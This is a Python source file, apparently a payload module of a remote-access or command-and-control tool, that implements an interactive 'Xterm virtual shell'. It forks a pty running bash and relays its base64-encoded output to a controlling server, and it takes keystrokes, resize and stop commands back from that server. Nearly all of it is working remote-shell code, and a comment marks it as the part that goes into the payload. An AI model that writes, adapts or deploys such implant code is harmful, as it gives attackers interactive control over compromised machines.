'''
Name: python3 Xterm virtual shell.
Author: ISSAC
Github: https://github.com/iss4cf0ng
'''

import sys

sys.path.append('../../../')

from lib.tool import EZData, Encoder

#[THE CODE ABOVE WILL NOT BE INCLUDED IN PAYLOAD]

import subprocess
import os
import pty
import select
import threading
import queue
import base64
import signal
import fcntl
import termios
import struct

class Shell:
    def __init__(self):
        self.szToken = None
        self.master_fd = None
        self.pid = None
        self.running = False
        self.ready = False

        self.input_q = queue.Queue()
        self.thread = None
        self.client = None

    def _start_shell(self, shell='/bin/bash', cwd=None):
        self.pid, self.master_fd = pty.fork()
        if self.pid == 0:
            if cwd:
                try:
                    os.chdir(cwd)
                except:
                    os.chdir(os.environ.get('HOME', '/'))

            os.environ['TERM'] = 'xterm-256color'
            os.environ['SHELL'] = shell

            os.execvp(shell, [shell, '-l', '-i'])
        else:
            self.running = True
            self.thread = threading.Thread(target=self._io_loop, daemon=True)
            self.thread.start()

            os.write(self.master_fd, b'clear\n')
            os.write(self.master_fd, b'')

    def _io_loop(self):
        try:
            while self.running:
                r, _, _ = select.select([self.master_fd], [], [], 0.2)

                if self.master_fd in r:
                    data = os.read(self.master_fd, 4096)
                    if data:
                        if not self.ready:
                            self.ready = True

                        b64data = base64.b64encode(data).decode()
                        #clnt.sendserver
                        self.client.sendserver([
                            self.szToken,
                            'shell',
                            'output',
                            b64data,
                        ])

                while not self.input_q.empty():
                    data = self.input_q.get_nowait()
                    os.write(self.master_fd, data)

        except Exception as ex:
            print(ex)

    def _resize(self, cols: int, rows: int):
        if self.master_fd is None:
            return
        
        ws = struct.pack('HHHH', rows, cols, 0, 0)
        fcntl.ioctl(self.master_fd, termios.TIOCSWINSZ, ws)

    def stop(self):
        self.running = False

        if self.pid:
            try:
                os.kill(self.pid, signal.SIGTERM)
            except:
                pass

        if self.master_fd:
            os.close(self.master_fd)

    def run(self, clnt: object, szToken: str, aMsg: list) -> list:
        try:
            self.client = clnt
            self.szToken = szToken
            cmd = aMsg[0]

            if cmd == 'init':
                shell = aMsg[1] if len(aMsg) > 1 else '/bin/bash'
                cwd = aMsg[2] if len(aMsg) > 2 else None
                self._start_shell(shell, cwd)
            elif cmd == 'input':
                if not self.ready:
                    return
                
                raw = base64.b64decode(aMsg[1])
                self.input_q.put(raw)

            elif cmd == 'resize':
                cols, rows = int(aMsg[1]), int(aMsg[2])
                self._resize(cols, rows)
            elif cmd == 'stop':
                pass
            else:
                print(cmd)
        except Exception as ex:
            print(ex)